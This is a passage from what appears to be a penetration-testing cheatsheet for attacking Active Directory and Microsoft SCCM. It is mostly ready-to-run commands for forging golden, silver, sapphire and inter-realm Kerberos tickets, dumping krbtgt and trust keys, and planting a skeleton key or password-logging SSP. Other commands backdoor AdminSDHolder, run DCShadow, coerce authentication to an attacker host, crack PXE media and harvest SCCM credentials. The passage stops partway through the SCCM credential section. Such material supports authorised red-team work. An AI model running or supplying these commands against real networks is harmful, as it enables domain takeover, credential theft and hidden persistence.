SQLCMD -S &lt;MSSQL_instance&gt; -Q "exec master.dbo.xp_dirtree '\\attacker@80\a'" -U Admin -P Admin

#After the attack, ask for a ST with full S4U
getST.py -spn cifs/target.domain.local -impersonate admininistrator -dc-ip &lt;DC_IP&gt; domain.local/&lt;controlledAccountWithASPN&gt;password
</code></pre>
<h2 id="bkmrk-domain-persistence">Domain Persistence</h2>
<h3 id="bkmrk-sapphire-ticket">Sapphire ticket</h3>
<p id="bkmrk-similar-to-diamond-t">Similar to <a href="https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/"><strong>Diamond Ticket</strong></a>, but instead of decipher, modify, recipher and resign the PAC on the fly, this technique inject a fully new one PAC obtained via a <em>S4USelf + U2U</em> attack in the requested ticket. Full explains <a href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire">here</a>.</p>
<pre id="bkmrk-ticketer.py--request"><code class="language-bash">ticketer.py -request -impersonate 'Administrator' -domain 'domain.local' -user 'user1' -password 'password' -aesKey 'krbtgt_AES_key' -domain-sid '&lt;domain_SID&gt;' 'blabla'
</code></pre>
<h3 id="bkmrk-diamond-ticket">Diamond ticket</h3>
<p id="bkmrk-blog-here"><a href="https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/">Blog here</a></p>
<p id="bkmrk-for-the-moment%2C-the-">For the moment, the <code>ticketer.py</code> approach is not really attractive and the <strong>Sapphire Ticket</strong> attack is preferable, or use Rubeus on Windows.</p>
<h3 id="bkmrk-golden-ticket">Golden ticket</h3>
<h4 id="bkmrk-dump-krbtgt-hash-wit">Dump krbtgt hash with DCSync</h4>
<pre id="bkmrk-secretsdump.py--just"><code class="language-bash">secretsdump.py -just-dc-user 'krbtgt' -just-dc-ntlm domain.local/administrator:password@&lt;DC&gt;
</code></pre>
<h4 id="bkmrk-create-tgt">Create TGT</h4>
<pre id="bkmrk-ticketer.py--domain-"><code class="language-bash">ticketer.py -domain domain.local -domain-sid &lt;domain_SID&gt; -nthash &lt;krbtgt_hash&gt; -user-id &lt;target_RID&gt; -duration &lt;ticket_lifetime_in_day&gt; &lt;target_user&gt;
</code></pre>
<h4 id="bkmrk-rodc-golden-ticket">RODC Golden Ticket</h4>
<p id="bkmrk-this-attack-is-prese-2">This attack is presented in the Active Directory cheatsheet.</p>
<h3 id="bkmrk-silver-ticket">Silver ticket</h3>
<pre id="bkmrk-ticketer.py--domain--0"><code class="language-bash">ticketer.py -domain domain.local -domain-sid &lt;domain_SID&gt; -spn 'cifs/target' -nthash &lt;account_hash&gt; -user-id &lt;target_RID&gt; -duration &lt;ticket_lifetime_in_day&gt; &lt;target_user&gt;
</code></pre>
<p id="bkmrk-another-solution%2C-if">Another solution, if you don't have the NT hash or the AES keys of the service but you have a TGT for the service account, is to impersonate an account via a request for a service ticket through S4USelf to an alternative service (and the opsec is better since the PAC is consistent):</p>
<pre id="bkmrk-export-krb5ccname%3D.%2F"><code class="language-bash">export KRB5CCNAME=./target_TGT.ccache
getST.py -self -impersonate "Administrator" -altservice "cifs/target.domain.local" -k -no-pass "domain.local"/'target$'
</code></pre>
<h3 id="bkmrk-goldengmsa">GoldenGMSA</h3>
<p id="bkmrk-this-attack-is-prese-3">This attack is presented in the Active Directory cheatsheet.</p>
<h3 id="bkmrk-skeleton-key">Skeleton key</h3>
<pre id="bkmrk-nxc-smb-%3Cdc_ip%3E--u-%27"><code class="language-bash">nxc smb &lt;DC_IP&gt; -u 'Administrator' -p 'password' -M mimikatz -o COMMAND='misc::skeleton'
</code></pre>
<p id="bkmrk-now%2C-it-is-possible-">Now, it is possible to access any machine with a valid username and password as "mimikatz"</p>
<h3 id="bkmrk-dsrm">DSRM</h3>
<ul id="bkmrk-dsrm-is-directory-se"><li>DSRM is Directory Services Restore Mode</li>
<li>The local administrator on every DC can authenticate with the DSRM password</li>
<li>It is possible to pass the hash of this user to access the DC after modifying the DC configuration</li>
</ul><h4 id="bkmrk-dump-dsrm-password">Dump DSRM password</h4>
<pre id="bkmrk-nxc-smb-%3Cdc_ip%3E--u-u"><code class="language-bash">nxc smb &lt;DC_IP&gt; -u user1 -p password --sam
</code></pre>
<h4 id="bkmrk-change-registry-conf">Change registry configuration</h4>
<p id="bkmrk-need-to-change-the-l">Need to change the logon behavior before pass the hash</p>
<pre id="bkmrk-reg.py--dc-ip-%3Cdc_ip-0"><code class="language-bash">reg.py -dc-ip &lt;DC_IP&gt; 'domain.local'/'Administrator':'password'@dc.domain.local add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\' -v 'DsrmAdminLogonBehavior' -vd 2 -vt REG_DWORD
</code></pre>
<p id="bkmrk-now-the-dsrm-hash-ca">Now the DSRM hash ca be used to authenticate</p>
<h3 id="bkmrk-custom-ssp">Custom SSP</h3>
<p id="bkmrk-ssp-are-ddls-that-pr">SSP are DDLs that provide ways to authenticate for the application. For example Kerberos, NTLM, WDigest, etc. Mimikatz provides a custom SSP that permits to log in a file in clear text the passwords of the users that authenticate on the machine.</p>
<ul id="bkmrk-by-patching-lsass-%28r"><li>By patching LSASS (really instable since Server 2016)</li>
</ul><pre id="bkmrk-nxc-smb-%3Ctarget%3E--u--7"><code class="language-bash">nxc smb &lt;target&gt; -u user1 -p password -M mimikatz -o COMMAND='misc::memssp'
</code></pre>
<ul id="bkmrk-by-modifying-the-lsa"><li>By modifying the LSA registry</li>
</ul><p id="bkmrk-upload-the-mimilib.d">Upload the <code>mimilib.dll</code> to <strong>system32</strong> and add mimilib to <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> :</p>
<pre id="bkmrk-%23retrieve-the-actual"><code class="language-bash">#Retrieve the actual values of Security Package
reg.py -dc-ip &lt;DC_IP&gt; 'domain.local'/'Administrator':'password'@dc.domain.local query -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\' -v 'Security Packages' -s

#Append mimilib to the previous list
reg.py -dc-ip &lt;DC_IP&gt; 'domain.local'/'Administrator':'password'@dc.domain.local add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\' -v 'Security Packages' -vd "&lt;list&gt; mimilib" -vt REG_MULTI_SZ
</code></pre>
<h3 id="bkmrk-dacls---adminsdholde">DACLs - AdminSDHolder</h3>
<p id="bkmrk-adminsdholder-is-a-s">AdminSDHolder is a solution that compares the ACLS of the objects with <code>AdminCount=1</code> with a list of ACLs. If the ACLs of the objects are different, they are overwritten. The script run normally every hour.</p>
<h4 id="bkmrk-attack">Attack</h4>
<ul id="bkmrk-with-write-privs-on-"><li>With write privs on the AdminSDHolder object, it can be used for persistence by adding a user with Full Permissions to the AdminSDHolder object for example.</li>
<li>When the automatic script will run, the user will be added with Full Control to the AC of groups like Domain Admins.</li>
</ul><pre id="bkmrk-dacledit.py--action--1"><code class="language-bash">dacledit.py -action write -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -principal user1 -rights FullControl -ace-type allowed -dc-ip &lt;DC_IP&gt; 'domain.local'/'administrator':'password'
</code></pre>
<h4 id="bkmrk-check-domain-admin-a">Check Domain Admin ACLs</h4>
<pre id="bkmrk-dacledit.py--action--2"><code class="language-bash">dacledit.py -action read -target "Domain Admins" -principal user1 -dc-ip &lt;DC_IP&gt; domain.local/user1:password
</code></pre>
<h3 id="bkmrk-dacls---interesting-">DACLs - Interesting rights</h3>
<p id="bkmrk-the-acls-can-be-used">The ACLs can be used for persistence purpose by adding interesting rights like DCSync, FullControl over the domain, etc. Check the <code>On any objects</code> in the ACLs attacks section.</p>
<h2 id="bkmrk-cross-trust-movement">Cross-Trust Movement</h2>
<p id="bkmrk-attacks-against-trus">Attacks against trusts are generally more efficient from a Windows machine with Mimikatz and Rubeus.</p>
<h3 id="bkmrk-child-to-parent-doma">Child to parent domain</h3>
<p id="bkmrk-escalate-from-a-chil">Escalate from a child domain to the root domain of the forest by forging a Golden Ticket with the SID of the <strong>Enterprise Admins</strong> group in the SID history field.</p>
<pre id="bkmrk-%23the-new-golden-tick"><code class="language-bash">#The new Golden Ticket will be written at the path specified in -w
raiseChild.py -w ./ticket.ccache child.domain.local/Administrator:password

#Dump the Administrator's hash of the root domain
raiseChild.py child.domain.local/Administrator:password

#PSEXEC on a machine
raiseChild.py -target-exec &lt;target&gt; child.domain.local/Administrator:password
</code></pre>
<h3 id="bkmrk-across-forest">Across forest</h3>
<h4 id="bkmrk-sid-history-attacks">SID History attacks</h4>
<p id="bkmrk-if-there-is-no-sid-f">If there is no SID filtering, it is possible to specify any privileged SID of the target forest in the SID History field. Otherwise, with partial filtering, an <strong>RID &gt; 1000</strong> must be indicated.</p>
<ul id="bkmrk-get-the-trust-key"><li>Get the Trust Key</li>
</ul><pre id="bkmrk-secretsdump.py--just-0"><code class="language-bash">secretsdump.py -just-dc-user '&lt;current_forest/target_forest$&gt;' domain.local/Administrator:password@&lt;DC&gt;
</code></pre>
<ul id="bkmrk-if-no-filtering-%3A-fo"><li>If <strong>no filtering</strong> : forge a referral ticket or an inter-realm Golden Ticket and request for a ST</li>
</ul><p id="bkmrk-ticketer.py-doesn%27t-"><code>ticketer.py</code> doesn't work really well with inter-realm TGT, it's preferable to use <strong>Mimikatz</strong> for this one.</p>
<pre id="bkmrk-%23referral-ticket-tic"><code class="language-bash">#Referral ticket
ticketer.py -domain domain.local -domain-sid &lt;domain_SID&gt; -extra-sid &lt;target_domain_SID&gt;-&lt;RID&gt; -aesKey &lt;aes_trust_key&gt; -spn "krbtgt/targetDomain.local" &lt;target_user&gt;

#Inter-realm Golden Ticket
ticketer.py -domain domain.local -domain-sid &lt;domain_SID&gt; -extra-sid &lt;target_domain_SID&gt;-&lt;RID&gt; -nthash &lt;krbtgt_hash&gt; &lt;target_user&gt;

export KRB5CCNAME=./ticket.ccache
getST.py -k -no-pass -spn CIFS/dc.targetDomain.local -dc-ip &lt;target_DC_IP&gt; targetDomain.local/user
</code></pre>
<ul id="bkmrk-if-there-is-sid-filt"><li>If <strong>there is SID filtering</strong>, same thing as above but with <strong>RID &gt; 1000</strong> (for example, Exchange related groups are sometimes highly privileged, and always with a RID &gt; 1000). Otherwise, get the <code>foreignSecurityPrincipal</code>. These users of the current domain are also members of the trusting forest, and they can be members of interesting groups:</li>
</ul><pre id="bkmrk-%23these-sids-are-memb"><code class="language-bash">#These SIDs are members of the target domain
ldeep ldap -u user1 -p password -d domain.local -s &lt;target_LDAP_server_IP&gt; search '(objectclass=foreignSecurityPrincipal)' | jq '.[].objectSid'

#The found SIDs can be search in the current forest
ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; search '(objectSid=&lt;object_SID&gt;)'
</code></pre>
<p id="bkmrk-then%2C-it-is-possible">Then, it is possible to forge an referral ticket for this user and access the target forest with its privileges.</p>
<h4 id="bkmrk-tgt-delegation">TGT delegation</h4>
<p id="bkmrk-by-default%2C-domain-c">By default, Domain Controllers are setup with Unconstrained Delegation (which is necessary in an Active Directory to correctly handle the Kerberos authentications).</p>
<p id="bkmrk-if-tgt-delegation-is">If TGT delegation is <strong>enabled</strong> in the trust attributes, it is possible to coerce the remote Domain Controller authentication from the compromised Domain Controller, and retrieve its TGT in the ST. If TGT delegation is <strong>disabled</strong>, the TGT will not be added in the ST, even with the Unconstrained Delegation.</p>
<p id="bkmrk-additionally%2C-select">Additionally, <strong>Selective Authentication must not be enabled</strong> on the trust, and a two ways trust is needed.</p>
<p id="bkmrk-how-to-exploit-an-un">How to exploit an <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-unconstrained-delega-0">Unconstrained Delegation</a>.</p>
<h4 id="bkmrk-transit-across-non-t">Transit across non-transitive trusts</h4>
<p id="bkmrk-warning-%21-for-the-mo"><strong>WARNING</strong> <strong>!</strong> For the moment, this attack has not been tested on Linux with Impacket but only with Rubeus from a Windows machine. The following commands are here for information purpose only and probably need some adjustments. I recommend you to perform this attack with Rubeus (look at the <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-transit-across-non-t">Active Directory cheatsheet</a>).</p>
<p id="bkmrk-if-a-non-transitive-">If a <strong>non-transitive</strong> trust is setup between domains from two different forests (domain A and B for example), users from domain A will be able to access resources in domain B (in case that B trusts A), but will not be able to access resources in other domains that trust domain B (for example, domain C). Non-transitive trusts are setup by default on <strong>External Trusts</strong> for example.</p>
<p id="bkmrk-however%2C-there-is-a-">However, there is a way to make non-transitive trusts transitive. Full explains <a href="https://exploit.ph/external-trusts-are-evil.html">here</a>.</p>
<p id="bkmrk-for-this-example%2C-th">For this example, there is an <strong>External Trust</strong> between domains A and B (which are in different forests), there is a <strong>Within Forest</strong> trust between domains B and C (which are in the same forest), and a <strong>Parent-child</strong> trust between domains C and D (so, they are in the same forest). We have a user (userA) in domain A, and we want to access services in domain D, which is normally impossible since <strong>External Trusts</strong> are non-transitive.</p>
<ul id="bkmrk-first%2C-obtain-a-tgt-"><li>First, obtain a TGT for userA in his <strong>domain A</strong>
</li>
</ul><pre id="bkmrk-gettgt.py--dc-ip-%3Cdc-0"><code class="language-bash">getTGT.py -dc-ip &lt;DC_A_IP&gt; domainA.local/userA:password
export KRB5CCNAME=./userA.ccache
</code></pre>
<ul id="bkmrk-then%2C-request-a-refe"><li>Then, request a referral for the <strong>domain B</strong> with the previously obtained TGT (for the moment, everything is normal). This referral can be used to access resources in <strong>domain B</strong> as userA</li>
</ul><pre id="bkmrk-getst.py--k--no-pass"><code class="language-bash">getST.py -k -no-pass -spn "krbtgt/domainB.local" -dc-ip &lt;DC_A_IP&gt; domainA.local/userA
</code></pre>
<ul id="bkmrk-with-this-referral%2C-"><li>With this referral, it is not possible to request for a ST in <strong>domain C</strong> since there is no transitivity. However, it is possible to use it to ask for a "local" TGT in domain B for userA. This will be a valid TGT in domain B and not a referral between A and B</li>
</ul><pre id="bkmrk-getst.py--k--no-pass-0"><code class="language-bash">getST.py -k -no-pass -spn "krbtgt/domainB.local" -dc-ip &lt;DC_B_IP&gt; domainA.local/userA
</code></pre>
<ul id="bkmrk-now%2C-this-tgt-can-be"><li>Now, this TGT can be reused to ask for a referral to access <strong>domain C</strong>, still from <strong>domain A with user A</strong>
</li>
</ul><pre id="bkmrk-getst.py--k--no-pass-1"><code class="language-bash">getST.py -k -no-pass -spn "krbtgt/domainC.local" -dc-ip &lt;DC_B_IP&gt; domainA.local/userA
</code></pre>
<p id="bkmrk-this-referral-for-do">This referral for <strong>domain C</strong> can be, in turn, used to access <strong>domain D</strong> with the same technique, and so on. This attack permits to pivot between all the trusts (and consequently the domains) in the same forest from a domain in a external forest.</p>
<p id="bkmrk-however%2C-it-is-not-p">However, it is not possible to directly use this technique to access a domain in another forest that would have a trust with <strong>domain D</strong>. For example, if <strong>domain D</strong> has an <strong>External Trust</strong> with <strong>domain E</strong> in a third forest, it will be not possible to access domain E from A.</p>
<p id="bkmrk-a-valid-workaround-i">A valid workaround is to use the referral for domain D to request a ST for LDAP in domain D, and use it to create a machine account. This account will be valid in domain D and will be used to restart the attack from domain D (like with user A) and access domain E.</p>
<pre id="bkmrk-getst.py--k--no-pass-2"><code class="language-bash">getST.py -k -no-pass -spn "ldap/dc.domainD.local" -dc-ip &lt;DC_D_IP&gt; domainA.local/userA
addcomputer.py -k -no-pass -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -domain-netbios domainD.local domainA.local/userA
#Then, ask for a TGT and replay the attack against domain E
</code></pre>
<h3 id="bkmrk-across-forest---pam-">Across forest - PAM trust</h3>
<p id="bkmrk-the-goal-is-to-compr">The goal is to compromise the <strong>bastion</strong> forest and pivot to the <strong>production</strong> forest to access to all the resources with a <strong>Shadow Security Principal</strong> mapped to a high privs group.</p>
<h4 id="bkmrk-check-if-the-current">Check if the current forest is a bastion forest</h4>
<p id="bkmrk-enumerate-trust-prop">Enumerate trust properties</p>
<ul id="bkmrk-foresttransitive-mus"><li>
<code>ForestTransitive</code> must be <strong>true</strong>
</li>
<li>
<code>SIDFilteringQuarantined</code> must be <strong>false</strong>
</li>
</ul><pre id="bkmrk-ldeep-ldap--u-user1--13"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; trusts
</code></pre>
<p id="bkmrk-enumerate-shadow-sec">Enumerate shadow security principals</p>
<pre id="bkmrk-ldeep-ldap--u-user1--14"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; search '(distinguishedName=*Shadow Principal Configuration*)' |jq '.[].name, .[].member, .[]."msDS-ShadowPrincipalSid"'
</code></pre>
<h4 id="bkmrk-check-if-the-current-0">Check if the current forest is managed by a bastion forest</h4>
<p id="bkmrk-foresttransitive-mus-0"><code>ForestTransitive</code> must be <strong>true</strong></p>
<pre id="bkmrk-ldeep-ldap--u-user1--15"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; trusts
</code></pre>
<p id="bkmrk-a-trust-attribute-of">A trust attribute of <code>1096</code> is for PAM (<code>0x00000400</code>) + External Trust (<code>0x00000040</code>) + Forest Transitive (<code>0x00000008</code>).</p>
<h4 id="bkmrk-get-the-shadow-secur">Get the shadow security principals</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--16"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; object "Shadow Principal Configuration" -v |jq '.[].name, .[].member, .[]."msDS-ShadowPrincipalSid"'
</code></pre>
<ul id="bkmrk-name---name-of-the-s"><li>
<code>Name</code> - Name of the shadow principal</li>
<li>
<code>member</code> - Members from the bastion forest which are mapped to the shadow principal</li>
<li>
<code>msDS-ShadowPrincipalSid</code> - The SID of the principal (user or group) in the user/production forest whose privileges are assgined to the shadow security principal. In our example, it is the Enterpise Admins group in the user forest</li>
</ul><p id="bkmrk-these-users-can-acce">These users can access the production forest through the trust with classic workflow (PSRemoting, RDP, etc), or with <code>SIDHistory</code> injection since <code>SIDFiltering</code> in a <strong>PAM Trust</strong>.</p>
<h3 id="bkmrk-sccm-hierarchy-takeo">SCCM Hierarchy takeover</h3>
<p id="bkmrk-in-case-an-organisat">In case an organisation has multiple SCCM primary sites dispersed between different domains, it has the possibility to setup a <strong>Central Administration Site</strong> to administrate all the sites from one "top" site server.</p>
<p id="bkmrk-if-it-the-case%2C-by-d">If it the case, by default the CAS will automatically replicate all the SCCM site admins between all the sites. This means, if you have takeover one site and added a controlled user as SCCM site admin, he will be automatically added as a site admin on all the other site by the CAS, and you can use him to pivote between the sites.</p>
<p id="bkmrk-full-explains-here.">Full explains <a href="https://medium.com/specter-ops-posts/sccm-hierarchy-takeover-41929c61e087">here</a>.</p>
<h2 id="bkmrk-forest-persistence--">Forest Persistence - DCShadow</h2>
<p id="bkmrk-must-be-tested-more-"><strong>MUST BE TESTED MORE CORRECTLY</strong></p>
<ul id="bkmrk-dcshadow-permits-to-"><li>DCShadow permits to create a rogue Domain Controller on a standard computer in the AD. This permits to modify objects in the AD without leaving any logs on the real Domain Controller</li>
<li>The compromised machine must be in the <strong>root domain</strong> on the forest, and the command must be executed as DA (or similar)</li>
</ul><p id="bkmrk-the-attack-needs-2-i">The attack needs 2 instances on the compromised machine.</p>
<ul id="bkmrk-one-to-start-rpc-ser"><li>One to start RPC servers with SYSTEM privileges and specify attributes to be modified</li>
</ul><pre id="bkmrk-nxc-smb-%3Ctarget%3E--u--8"><code class="language-bash">nxc smb &lt;target&gt; -u Administrator -p password -M mimikatz -o COMMAND='"token::elevate" "privilege::debug" "lsadump::dcshadow /object:&lt;object_to_modify&gt; /attribute:&lt;attribute_to_modify&gt; /value=&lt;value_to_set&gt;"'
</code></pre>
<ul id="bkmrk-and-second-with-enou"><li>And second with enough privileges (DA or otherwise) to push the values :</li>
</ul><pre id="bkmrk-nxc-smb-%3Ctarget%3E--u--9"><code class="language-bash">nxc smb &lt;target&gt; -u Administrator -p password -M mimikatz -o COMMAND='lsadump::dcshadow /push' --server-port 8080
</code></pre>
<h3 id="bkmrk-set-interesting-attr">Set interesting attributes</h3>
<h4 id="bkmrk-set-sidhistory-to-en">Set SIDHistory to Enterprise Admin</h4>
<pre id="bkmrk-lsadump%3A%3Adcshadow-%2Fo"><code class="language-bash">lsadump::dcshadow /object:user1 /attribute:SIDHistory /value:&lt;domain_SID&gt;-519
</code></pre>
<h4 id="bkmrk-modify-primarygroupi">Modify primaryGroupID</h4>
<pre id="bkmrk-lsadump%3A%3Adcshadow-%2Fo-0"><code class="language-bash">lsadump::dcshadow /object:user1 /attribute:primaryGroupID /value:519
</code></pre>
<h4 id="bkmrk-set-a-spn-on-an-user">Set a SPN on an user</h4>
<pre id="bkmrk-lsadump%3A%3Adcshadow-%2Fo-1"><code class="language-bash">lsadump::dcshadow /object:user1 /attribute:servicePrincipalName /value:"Legitime/User1"
</code></pre>
<h2 id="bkmrk-references">References</h2>
<ul id="bkmrk-the-hacker-recipes-p"><li>
<a href="https://www.thehacker.recipes">The Hacker Recipes</a>
</li>
<li>
<a href="https://www.pentesteracademy.com">Pentester Academy</a>
</li>
<li>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md">PayloadAllTheThings</a>
</li>
<li>
<a href="https://swisskyrepo.github.io/InternalAllTheThings/">InternalAllTheThings</a>
</li>
<li>
<a href="https://pentestlab.blog/">Pentestlab.blog</a>
</li>
<li>
<a href="https://book.hacktricks.xyz/welcome/readme">HackTricks</a>
</li>
<li>
<a href="https://cheatsheet.haax.fr/">Haax</a>
</li>
<li>
<a href="https://www.ired.team">Red Teaming Experiments</a>
</li>
<li>
<a href="https://posts.specterops.io">SpecterOps</a>
</li>
<li>
<a href="https://www.mdsec.co.uk/knowledge-centre/research/">MDSec</a>
</li>
<li>
<a href="https://www.synacktiv.com/publications%253Ffield_tags_target_id%253D4">Synacktiv</a>
</li>
<li>
<a href="https://bloodhound.readthedocs.io/en/latest/index.html">BloodHound</a>
</li>
<li>
<a href="https://cube0x0.github.io">Cube0x0</a>
</li>
<li>
<a href="https://dirkjanm.io">Dirk-jan Mollema</a>
</li>
<li>
<a href="https://ppn.snovvcrash.rocks">Snovvcrash</a>
</li>
<li>
<a href="https://exploit.ph/">Exploit.ph</a>
</li>
<li>
<a href="https://blog.xpnsec.com/">Adam Chester</a>
</li>
<li>
<a href="https://medium.com/@oliverlyak">Olivier Lyak</a>
</li>
<li>
<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog</a>
</li>
<li>
<a href="https://z4ksec.github.io/posts/masky-release-v0.0.3/">Masky release</a>
</li>
<li>
<a href="https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/">Active Directory Spotlight</a>
</li>
<li>
<a href="https://www.acceis.fr/ldap-pass-back-attack/">LDAP Pass back</a>
</li>
<li>
<a href="https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/">SOAPHound</a>
</li>
<li>
<a href="https://blog.slowerzs.net/posts/thievingfox/">ThievingFox</a>
</li>
<li>
<a href="https://www.hackthebox.com/">Hack The Box</a>
</li>
</ul>
                                    <div class="page-break"></div>
                    <div class="chapter-hint">Microsoft</div>
                    <h1 id="page-81">System Center Configuration Manager</h1>
                    <p id="bkmrk-this-cheatsheet-is-b">This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and labs, and other resources found on the web or through my experience. This was originally a private page that I made public, so it is possible that I have copy/paste some parts from other places and I forgot to credit or modify. If it the case, you can contact me on my Twitter <a href="https://twitter.com/BlWasp_"><strong>@BlWasp_</strong></a>.</p>
<p id="bkmrk-i-will-try-to-put-as">I will try to put as many links as possible at the end of the page to direct to more complete resources.</p>
<p id="bkmrk-system-center-config"><strong>System Center Configuration Manager</strong> (SCCM), renamed <strong>Microsoft Endpoint Configuration Manager</strong> (MECM) and, more recently, <strong>Microsoft Configuration Manager</strong> (ConfigMgr), is a software developed by Microsoft to help system administrators manage the servers and workstations in large Active Directory environments.</p>
<h2 id="bkmrk-pxe-initial-access">PXE initial access</h2>
<p id="bkmrk-a-pxe-boot-server-ca">A PXE boot server can be embedded in the SCCM infrastructure. However, identifying a PXE server on the network does not necessarily imply the presence of an SCCM infrastructure, and the presence of SCCM doesn't indicate that a PXE boot is present.</p>
<p id="bkmrk-pxethief-is-only-ava"><a href="https://github.com/MWR-CyberSec/PXEThief">PXEThief</a> is only available on Windows because of the <code>pywin32</code> library dependency, and works better with Python 3.10.</p>
<pre id="bkmrk-%23-identify-a-pxe-ser"><code class="language-powershell"># Identify a PXE server over the network with DHCP request
python3.10.exe .\pxethief.py 1

# Indicate the Distribution Point IP to veriy if there is any PXE on it
python3.10.exe .\pxethief.py 2 &lt;DP_IP&gt;
</code></pre>
<p id="bkmrk-if-the-media-is-encr">If the media is encrypted, request it like this:</p>
<pre id="bkmrk-tftp--i-%3Cdp_ip%3E-get-"><code class="language-powershell">tftp -i &lt;DP_IP&gt; GET "\SMSTemp\&lt;XXX&gt;.boot.var" "&lt;XXX&gt;.boot.var"
</code></pre>
<p id="bkmrk-then%2C-compute-the-ha">Then, compute the hash and crack it with hashcat's dedicated module:</p>
<pre id="bkmrk-python3.10.exe-.%5Cpxe"><code class="language-powershell">python3.10.exe .\pxethief.py 5 '&lt;XXX&gt;.boot.var'
</code></pre>
<pre id="bkmrk-cd-hashcat_pxe%2F-git-"><code class="language-bash">cd hashcat_pxe/
git clone https://github.com/hashcat/hashcat.git
git clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
cp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/
cp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850* hashcat/OpenCL/
cd hashcat
# change to 6.2.5
git checkout -b v6.2.5 tags/v6.2.5
make

cd ..
hashcat/hashcat -m 19850 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txtou.txt
</code></pre>
<p id="bkmrk-finally-request-the-">Finally request the media, decrypt it with the password and retrieve sensitive information inside:</p>
<pre id="bkmrk-python3.10.exe-.%5Cpxe-0"><code class="language-powershell">python3.10.exe .\pxethief.py 3 'XXX.boot.var' "Password123!"
</code></pre>
<p id="bkmrk-or-alternatively%2C-po">Or alternatively, <strong>PowerPXE</strong> is a PowerShell script that extracts interesting data from insecure PXE boot.</p>
<pre id="bkmrk-import-module-powerp"><code class="language-powershell">Import-Module PowerPxe
Get-PXEcreds -InterfaceAlias Ethernet
</code></pre>
<h2 id="bkmrk-recon">Recon</h2>
<p id="bkmrk-techniques-to-identi">Techniques to identify SCCM servers and related objects in an Active Directory.</p>
<h3 id="bkmrk-windows">Windows</h3>
<pre id="bkmrk-%23with-powershell-%28%5Ba"><code class="language-powershell">#With PowerShell
([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties}

#With SharpSCCM
./SharpSCCM.exe local site-info
./SharpSCCM.exe local client-info
</code></pre>
<h3 id="bkmrk-linux">Linux</h3>
<pre id="bkmrk-%23find-the-assets-in-"><code class="language-bash">#Find the assets in the LDAP configuration
python3 sccmhunter.py find -u user1 -p password -d domain.local -dc-ip &lt;DC_IP&gt;

#Retrieve informations regarding the identified servers (SMB signing, site code, server type, etc)
#And save PXE variables
python3 sccmhunter.py smb -u user1 -p password -d domain.local -dc-ip &lt;DC_IP&gt; -save

#Show results from the previous commands
python3 sccmhunter.py show -smb
python3 sccmhunter.py show -user
python3 sccmhunter.py show -computers
python3 sccmhunter.py show -all
</code></pre>
<h2 id="bkmrk-credentials-harvesti">Credentials harvesting</h2>
<h3 id="bkmrk-client-push-accounts">Client Push Accounts</h3>
<p id="bkmrk-with-a-compromised-m">With a compromised machine in an Active Directory where SCCM is deployed via <strong>Client Push Accounts</strong> (the default configuration) on the assets, it is possible to retrieve the Net-NTLM hash of the Client Push Account, which generally has Administrator privileges on lots of assets. Full explains <a href="https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts">here</a>. To do it:</p>
<ul id="bkmrk-remove-all-the-local"><li>Remove all the local Administrators on the compromised machine : <code>net user &lt;username&gt; /delete</code>
</li>
<li>Listen with Inveigh : <code>Invoke-Inveigh -Challenge 1122334455667788 -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y</code>
</li>
<li>Wait for the Client Push Accounts that will attempt to authenticate automatically</li>
<li>Hope for Net-NTLMv1, relay possibility or whatever</li>
</ul><p id="bkmrk-with-sharpsccm-it-is">With SharpSCCM it is possible to accelerate the process by coercing a Client Push Accounts authentication.</p>
<pre id="bkmrk-%23if-admin-access-ove"><code class="language-powershell">#If admin access over Management Point (useful to clean the MP cache with the attacker machine)
./SharpSCCM.exe invoke client-push -t &lt;attacker_IP&gt; --as-admin

#If not MP admin (need to conctact an administrator to clean the cache)
./SharpSCCM.exe invoke client-push -t &lt;attacker_IP&gt;
</code></pre>
<h3 id="bkmrk-local-sccm-credentia">Local SCCM credentials extraction</h3>
<p id="bkmrk-multiple-secrets-and">Multiple secrets and credentials can be extracted on a machine enrolled in SCCM. For example, it is possible to retrieve the <strong>Network Access Accounts (NAA)</strong> in the NAA policy which it's sent by the SCCM server and stored on the SCCM client disk encrypted with DPAPI, and the <strong>TaskSequence</strong> and <strong>Device Collection</strong> variables, also encrypted by DPAPI.</p>
<h4 id="bkmrk-windows-0">Windows</h4>
<p id="bkmrk-with-system-access-o">With SYSTEM access on the client, the credentials can be retrieved via WMI with PowerShell:</p>
<pre id="bkmrk-%23network-access-acco"><code class="language-powershell">#Network Access Accounts (NAA)
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount

